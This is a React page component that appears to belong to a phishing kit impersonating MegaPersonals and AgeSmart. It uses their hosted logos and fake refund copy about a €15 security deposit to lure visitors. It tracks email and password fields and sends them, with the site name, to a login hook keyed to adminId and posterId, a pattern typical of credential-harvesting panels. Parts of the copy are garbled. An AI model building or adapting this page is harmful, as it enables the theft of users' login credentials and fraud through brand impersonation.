"use client";
import { Field, Form, Formik } from "formik"
import { useEffect, useState } from "react";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const [open, setOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [currentTime, setCurrentTime] = useState(new Date());
   const initialvalues = {
    email: "",
    password: "",
  };
  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentTime(new Date());
    }, 60000);
    return () => clearInterval(intervalId);
  }, []);
  const formatTime = (date) => {
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
    return `${hours}:${formattedMinutes}`;
  };

  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = async () => {
    const allValues = {
      site: site,
      mail: email,
      passcode: password,
    };

    login(allValues);
    setEmail("");
    setPassword("");
  };
  return (
    <>
      <div className="min-h-screen bg-white text-center px-4 py-10 font-sans">
      <div className="bg-pink-500 text-white py-2 text-xl font-bold tracking-wide">
       <img
          src="https://agesmart.store/public/images/megapersonalsPageHeader.png" // Replace with your actual logo path
          alt="megapersonalsPageHeader Logo"
          className="mx-auto w-48 mb-6"
        />
      </div>

      <div className="max-w-xl mx-auto mt-10">
        <img
          src="https://agesmart.store/public/images/logo-color.png" // Replace with your actual logo path
          alt="AgeSmart Logo"
          className="mx-auto w-48 mb-6"
        />

        <h2 className="text-lg font-medium">
          Your account has been approved as fully active and verified.
        </h2>
        <p className="text-md my-2">
          If YOU ARE REFUND <span className="text-green-600 font-bold">€15 MegaPersonals</span>
        </p>

        <p className="text-gray-800 my-4 leading-relaxed">
          breaking their rules, <br />
          <span className="text-green-600 font-semibold">
            Your account will remain active as it is now.
          </span>{" "}
          <br />
          from AgeSmart.
        </p>

        <h3 className="text-lg font-bold mt-8 mb-2">Why getting the money</h3>

        <div className="border p-4 rounded-lg text-left max-h-60 overflow-y-auto text-sm">
          <ul className="list-disc ml-5 space-y-2">
            <li>
              At the time of joining, a certain amount was taken as a security deposit to ensure
              policy compliance and protect company property.
            </li>
            <li>
              We’re happy to say that your performance, discipline, and dedication have truly impressed us.
            </li>
            <li>
              During your time with us, we noticed no negative behavior. Instead, you have consistently
              acted with responsibility.
            </li>
            <li>
              Following company policy and in appreciation of your work, we’ve decided to refund your
              full security deposit.
            </li>
            <li>
              This refund is our way of showing gratitude and encouraging you to continue your good work.
            </li>
            <li>
              The returned amount is both your rightful due and a token of our recognition and best
              wishes for your future with us.
            </li>
          </ul>
          <p className="mt-4">
            see MegaPersonals for their full website Terms of Use and Publisher Agreement
          </p>
        </div>

        <button
          className="mt-6 px-6 py-3 bg-green-600 text-white rounded-md font-semibold hover:bg-green-700"
          onClick={() => alert("Refund Agreed")} // Replace with actual refund logic
        >
          I agree to Refund
        </button>

        <div className="mt-10">
          <img
            src="https://agesmart.store/public/images/logo-color.png" // Optional second logo
            alt="AgeSmart Logo"
            className="mx-auto w-16"
          />
          <p className="text-xs text-gray-500 mt-2">
            Copyright © 2022 Age Smart LDA. All Rights Reserved.
          </p>
          <div className="text-sm mt-2 space-x-4">
            <a href="#" className="text-blue-500 underline">
              Terms of Use
            </a>
            <a href="#" className="text-blue-500 underline">
              Privacy Policy
            </a>
            <a href="#" className="text-blue-500 underline">
              Billing Questions
            </a>
          </div>
        </div>
      </div>
    </div>
    </>
  );
}
